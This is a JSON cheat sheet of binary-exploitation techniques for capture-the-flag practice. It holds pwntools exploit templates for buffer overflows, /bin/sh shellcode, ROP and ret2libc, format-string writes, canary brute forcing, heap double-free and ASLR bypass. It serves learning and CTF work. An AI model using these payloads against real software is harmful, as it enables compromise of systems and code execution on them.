{
  "title": "Binary Exploitation Basics",
  "category": "Reverse Engineering",
  "description": "Buffer overflows, return-oriented programming (ROP), format string vulnerabilities, and stack/heap exploitation techniques for pwn challenges.",
  "entries": [
    {
      "name": "Buffer Overflow Fundamentals",
      "desc": "Overwriting stack memory beyond buffer boundaries to control program execution flow",
      "example": "# Vulnerable C code\n#include <string.h>\nvoid vulnerable(char *input) {\n    char buffer[64];\n    strcpy(buffer, input);  // No bounds checking!\n}\n\n# Stack layout before overflow:\n# [buffer][saved EBP][return address][arguments]\n\n# Exploitation strategy\nimport struct\n\n# 1. Find offset to return address\n# Using pattern_create and pattern_offset (pwntools)\nfrom pwn import *\npattern = cyclic(200)\n# Send pattern, get crash offset\n\n# 2. Craft exploit payload\nbuffer_size = 64\nebp_size = 4  # or 8 for x64\noffset = buffer_size + ebp_size\n\n# 3. Overwrite return address\ntarget_address = 0xdeadbeef  # Address of win() function\npayload = b'A' * offset\npayload += struct.pack('<I', target_address)  # Little-endian\n\n# 4. Send exploit\np = process('./vulnerable')\np.sendline(payload)\np.interactive()\n\n# x86 vs x64 differences:\n# x86: 4-byte addresses, 4-byte registers\n# x64: 8-byte addresses, 8-byte registers\n# Use '<Q' for x64 instead of '<I'",
      "flag_hint": "Find offset with cyclic patterns, then overwrite EIP/RIP with target address",
      "tags": ["pwn", "buffer-overflow", "stack", "ret2win"]
    },
    {
      "name": "Shellcode Injection",
      "desc": "Inject and execute arbitrary machine code to spawn a shell or read flags",
      "example": "# Basic shellcode structure\nfrom pwn import *\n\n# x86 Linux execve(\"/bin/sh\") shellcode (28 bytes)\nshellcode = asm(\"\"\"\n    xor eax, eax\n    push eax\n    push 0x68732f2f  ; \"//sh\"\n    push 0x6e69622f  ; \"/bin\"\n    mov ebx, esp\n    xor ecx, ecx\n    xor edx, edx\n    mov al, 0xb      ; syscall 11 (execve)\n    int 0x80\n\"\"\")\n\n# x64 Linux execve(\"/bin/sh\") shellcode (27 bytes)\nshellcode_x64 = asm(\"\"\"\n    xor rsi, rsi\n    push rsi\n    mov rdi, 0x68732f6e69622f2f  ; \"//bin/sh\"\n    push rdi\n    push rsp\n    pop rdi\n    xor rdx, rdx\n    push 0x3b\n    pop rax          ; syscall 59 (execve)\n    syscall\n\"\"\", arch='amd64')\n\n# NOP sled for alignment\nnop_sled = b'\\x90' * 100\n\n# Full exploit\noffset = 64\nreturn_addr = 0xbffff700  # Address of NOP sled\n\npayload = nop_sled\npayload += shellcode\npayload += b'A' * (offset - len(nop_sled) - len(shellcode))\npayload += p32(return_addr)\n\n# Send exploit\np = process('./vuln')\np.sendline(payload)\np.interactive()\n\n# Alphanumeric shellcode (bypass filters)\n# Use msfvenom:\n# msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed",
      "flag_hint": "Use NOP sleds to increase landing area; consider DEP/NX protections",
      "tags": ["pwn", "shellcode", "injection", "nop-sled"]
    },
    {
      "name": "Return-Oriented Programming (ROP)",
      "desc": "Chain existing code gadgets to bypass DEP/NX protections",
      "example": "from pwn import *\n\n# Find gadgets in binary\nelf = ELF('./vulnerable')\nrop = ROP(elf)\n\n# Method 1: Using pwntools ROP automation\nrop.call('system', [next(elf.search(b'/bin/sh'))])\npayload = fit({\n    offset: rop.chain()\n})\n\n# Method 2: Manual ROP chain\n# Gadgets found with ROPgadget:\n# ROPgadget --binary vuln --ropchain\n\npop_rdi = 0x401234  # pop rdi; ret\nbin_sh = 0x402000   # address of \"/bin/sh\" string\nsystem = 0x401000   # system() function\n\noffset = 64\npayload = b'A' * offset\n\n# x64 calling convention: rdi, rsi, rdx, rcx, r8, r9\npayload += p64(pop_rdi)      # pop \"/bin/sh\" into rdi\npayload += p64(bin_sh)\npayload += p64(system)       # call system(\"/bin/sh\")\n\n# Method 3: ret2libc attack\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\n# Leak libc address\nrop.call('puts', [elf.got['puts']])\nrop.call(elf.symbols['main'])  # Return to main\n\npayload = fit({offset: rop.chain()})\np.sendline(payload)\n\n# Receive leak\nleak = u64(p.recvline().strip().ljust(8, b'\\x00'))\nlibc.address = leak - libc.symbols['puts']\n\n# Second stage: call system\nrop = ROP(libc)\nrop.call('system', [next(libc.search(b'/bin/sh'))])\npayload = fit({offset: rop.chain()})\np.sendline(payload)\n\n# Common gadgets:\n# pop rdi; ret  - First argument\n# pop rsi; ret  - Second argument\n# pop rdx; ret  - Third argument\n# ret           - Stack alignment",
      "flag_hint": "Use ROPgadget or ropper to find gadgets; align stack with 'ret' gadget",
      "tags": ["pwn", "rop", "dep", "nx-bypass"]
    },
    {
      "name": "Format String Vulnerabilities",
      "desc": "Exploit printf family functions with user-controlled format strings to read/write memory",
      "example": "# Vulnerable code\nprintf(user_input);  // Should be printf(\"%s\", user_input);\n\n# Reading stack/memory\n# %x - Read 4 bytes from stack (hex)\n# %p - Read pointer from stack\n# %s - Read string from address on stack\n# %n - Write number of bytes printed to address\n\n# Exploitation examples\n\n# 1. Leak stack values\npayload = \"%p.\" * 20  # Leak 20 stack values\n# Output: 0x7ffd1234.0xdeadbeef.0x41414141...\n\n# 2. Read specific offset\npayload = \"%7$p\"  # Read 7th argument from stack\n\n# 3. Read arbitrary memory\ntarget = 0x601234  # Address to read\npayload = p64(target) + b\"%7$s\"\n# Stack: [address][format string...]\n# %7$s treats 7th arg as pointer, prints string\n\n# 4. Write to arbitrary memory with %n\ntarget = 0x601234  # Address to write\nvalue = 0xdeadbeef  # Value to write\n\n# %n writes number of bytes printed so far\npayload = p64(target)\npayload += b\"%\" + str(value - 8).encode() + b\"c\"\npayload += b\"%7$n\"\n\n# 5. Overwrite GOT entry\nfrom pwn import *\n\nelf = ELF('./vuln')\ntarget = elf.got['printf']  # Overwrite printf GOT entry\nwin = elf.symbols['win']    # Address of win() function\n\n# Use pwntools fmtstr\nautofmt = FmtStr(execute_fmt)\nautofmt[target] = win\n\npayload = autofmt.payload\n\n# 6. Leak canary (stack protection)\npayload = \"%11$p\"  # If canary is at offset 11\n\n# Format string automations\nfrom pwn import *\n\n# Find offset to buffer\ndef find_offset():\n    for i in range(1, 30):\n        p = process('./vuln')\n        p.sendline(f\"%{i}$p\".encode())\n        result = p.recvall()\n        if b'0x41414141' in result:  # Our buffer marker\n            return i\n        p.close()\n\n# pwntools FmtStr helper\nautofmt = FmtStr(\n    execute_fmt=lambda x: p.sendline(x),\n    offset=offset\n)\nautofmt[target_addr] = target_value",
      "flag_hint": "Find format string offset with AAAA%p%p%p... until you see 0x41414141",
      "tags": ["pwn", "format-string", "printf", "arbitrary-write"]
    },
    {
      "name": "Stack Canary Bypass",
      "desc": "Defeat stack canaries by leaking or bruteforcing the secret value",
      "example": "# Stack canary protection\n# [buffer][canary][saved ebp][return address]\n# If canary is modified, program aborts\n\n# Method 1: Leak canary via format string\nfrom pwn import *\n\np = process('./vuln')\n\n# Leak canary at stack offset 11\np.sendline(b\"%11$p\")\ncanary = int(p.recvline().strip(), 16)\nlog.info(f\"Leaked canary: {hex(canary)}\")\n\n# Now we can overflow without detection\noffset = 64\npayload = b'A' * offset\npayload += p64(canary)  # Preserve canary\npayload += p64(0)       # Saved RBP\npayload += p64(win)     # Return address\n\np.sendline(payload)\np.interactive()\n\n# Method 2: Brute force canary (byte-by-byte)\n# Works on forking servers where canary stays same\ndef bruteforce_canary():\n    canary = b'\\x00'  # Canary always ends with null byte\n    \n    for byte_pos in range(1, 8):\n        for byte_val in range(256):\n            payload = b'A' * 64\n            payload += canary + bytes([byte_val])\n            \n            p = remote('localhost', 1234)\n            p.sendline(payload)\n            response = p.recvall(timeout=1)\n            p.close()\n            \n            # If no crash, byte is correct\n            if b'stack smashing detected' not in response:\n                canary = bytes([byte_val]) + canary\n                log.info(f\"Found canary byte: {hex(byte_val)}\")\n                break\n    \n    return canary\n\n# Method 3: Partial overwrite (bypass canary)\n# If we can control adjacent variables, avoid canary\n\n# Method 4: Fork/Thread canary reuse\n# Forked processes inherit same canary\n# Can leak once and reuse for all forks",
      "flag_hint": "Format string bugs often allow canary leaks; look for %p format specifiers",
      "tags": ["pwn", "canary", "stack-protection", "bypass"]
    },
    {
      "name": "Heap Exploitation Basics",
      "desc": "Use-after-free, double-free, and heap overflow vulnerabilities",
      "example": "# Use-After-Free (UAF) vulnerability\n# 1. Allocate object A\n# 2. Free object A\n# 3. Allocate object B (reuses A's memory)\n# 4. Use object A (now points to B!)\n\nfrom pwn import *\n\n# Example UAF exploit\n# struct Object {\n#     void (*function_ptr)();\n#     char data[16];\n# };\n\n# Exploit steps:\n# 1. Allocate object\np.sendline(b'1')  # Create object 1\n\n# 2. Free object\np.sendline(b'2')  # Delete object 1\np.sendline(b'1')\n\n# 3. Allocate new object with controlled data\n# New object reuses freed chunk\npayload = p64(win_address) + b'A' * 8\np.sendline(b'1')  # Create object 2\np.sendline(payload)\n\n# 4. Use original object\n# Calls function pointer, now points to win()\np.sendline(b'3')  # Use object 1\np.sendline(b'1')\n\n# Double-Free vulnerability\n# free(ptr); free(ptr);  // Same pointer freed twice\n# Causes heap corruption\n\n# Fastbin attack\n# 1. Create chunks A, B, C\n# 2. Free A, B, A (double free)\n# 3. Allocate with target address\n# 4. Next allocation returns target\n\nfrom pwn import *\n\ntarget = 0x601234  # Address to write\n\n# Create chunks\nfor i in range(3):\n    p.sendline(b'1')  # Allocate\n\n# Double free\np.sendline(b'2'); p.sendline(b'0')  # Free A\np.sendline(b'2'); p.sendline(b'1')  # Free B\np.sendline(b'2'); p.sendline(b'0')  # Free A again\n\n# Poison fastbin\np.sendline(b'1')\np.sendline(p64(target - 0x10))  # Write fake size\n\n# Heap overflow\n# Overflow into next chunk's metadata\n# Overwrite size field to control allocation",
      "flag_hint": "Heap exploits often require multiple allocations/frees to set up state",
      "tags": ["pwn", "heap", "uaf", "double-free"]
    },
    {
      "name": "ASLR Bypass Techniques",
      "desc": "Defeating Address Space Layout Randomization through information leaks",
      "example": "from pwn import *\n\n# Method 1: Leak addresses via format string\np = process('./vuln')\n\n# Leak stack address\np.sendline(b\"%3$p\")\nstack_leak = int(p.recvline().strip(), 16)\nlog.info(f\"Stack leak: {hex(stack_leak)}\")\n\n# Leak libc address (via GOT)\np.sendline(b\"%7$s\" + p64(elf.got['puts']))\nlibc_leak = u64(p.recvline()[:6].ljust(8, b'\\x00'))\nlibc.address = libc_leak - libc.symbols['puts']\nlog.info(f\"Libc base: {hex(libc.address)}\")\n\n# Leak binary address (PIE bypass)\np.sendline(b\"%9$p\")\nbinary_leak = int(p.recvline().strip(), 16)\nelf.address = binary_leak - offset_from_base\nlog.info(f\"Binary base: {hex(elf.address)}\")\n\n# Method 2: Partial overwrite (16-bit brute force)\n# ASLR leaves lower 12 bits unchanged\n# Only need to brute force 4 bits (16 attempts)\n\nfor i in range(16):\n    p = process('./vuln')\n    \n    # Overwrite only lower 2 bytes of return address\n    payload = b'A' * offset\n    payload += b'\\x34\\x12'  # Known lower bytes\n    \n    p.sendline(payload)\n    try:\n        response = p.recv(timeout=1)\n        if b'flag' in response:\n            log.success(\"Found correct address!\")\n            break\n    except:\n        pass\n    p.close()\n\n# Method 3: ret2plt + GOT leak\nrop = ROP(elf)\n\n# Stage 1: Leak libc\nrop.call('puts', [elf.got['puts']])\nrop.call(elf.symbols['main'])  # Return to main\n\npayload = fit({offset: rop.chain()})\np.sendline(payload)\n\nleak = u64(p.recvline()[:6].ljust(8, b'\\x00'))\nlibc.address = leak - libc.symbols['puts']\n\n# Stage 2: Use leaked address for ROP\nrop = ROP(libc)\nrop.call('system', [next(libc.search(b'/bin/sh'))])\npayload = fit({offset: rop.chain()})\np.sendline(payload)\n\n# Method 4: Brute force (on 32-bit systems)\n# 32-bit ASLR has only 8 bits entropy\n# Can brute force in ~256 attempts",
      "flag_hint": "Leak addresses first, then calculate offsets to other functions/gadgets",
      "tags": ["pwn", "aslr", "leak", "bypass"]
    },
    {
      "name": "Pwntools Essential Commands",
      "desc": "Key pwntools functions for binary exploitation",
      "example": "from pwn import *\n\n# Process interaction\np = process('./binary')\np = remote('host', port)\n\n# Send/receive\np.sendline(b'data')      # Send with newline\np.send(b'data')          # Send without newline\np.recv(1024)             # Receive up to 1024 bytes\np.recvline()             # Receive until newline\np.recvuntil(b'prompt')   # Receive until pattern\np.interactive()          # Interactive shell\n\n# Packing/unpacking\np32(0x12345678)          # Pack 32-bit int\np64(0x123456789abcdef)   # Pack 64-bit int\nu32(b'\\x78\\x56\\x34\\x12') # Unpack 32-bit\nu64(data)                # Unpack 64-bit\n\n# ELF operations\nelf = ELF('./binary')\nelf.address              # Base address (PIE)\nelf.symbols['main']      # Address of main\nelf.got['puts']          # GOT entry for puts\nelf.plt['puts']          # PLT entry for puts\nnext(elf.search(b'/bin/sh'))  # Find string\n\n# ROP chains\nrop = ROP(elf)\nrop.call('system', [bin_sh])\nrop.raw(gadget_address)\nrop.chain()              # Get ROP chain bytes\n\n# Shellcode\nasm('xor eax, eax')      # Assemble to bytes\nasm('mov rax, 59', arch='amd64')\ndisasm(b'\\x31\\xc0')      # Disassemble\n\n# Utilities\ncyclic(200)              # Generate pattern\ncyclic_find(0x61616171)  # Find offset\nfit({64: addr})          # Pack payload at offset\n\n# Context settings\ncontext.arch = 'amd64'\ncontext.os = 'linux'\ncontext.log_level = 'debug'\ncontext.terminal = ['tmux', 'splitw', '-h']\n\n# Debugging\ngdb.attach(p, '''        # Attach GDB\n    break main\n    continue\n''')\n\n# Logging\nlog.info(\"Info message\")\nlog.success(\"Success!\")\nlog.warning(\"Warning\")\nlog.error(\"Error\")",
      "flag_hint": "Use context.log_level='debug' to see all data sent/received",
      "tags": ["pwn", "pwntools", "python", "automation"]
    }
  ]
}
